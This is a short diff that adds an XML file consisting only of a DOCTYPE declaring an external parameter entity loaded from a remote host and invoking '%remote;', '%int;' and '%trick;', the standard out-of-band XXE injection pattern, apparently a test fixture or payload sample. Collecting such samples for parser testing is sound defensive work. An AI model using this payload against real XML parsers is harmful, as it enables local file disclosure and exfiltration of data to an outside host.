@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "http://chickenfeet.glitterpants.org/dtd.xml">
+%remote;
+%int;
+%trick;]>
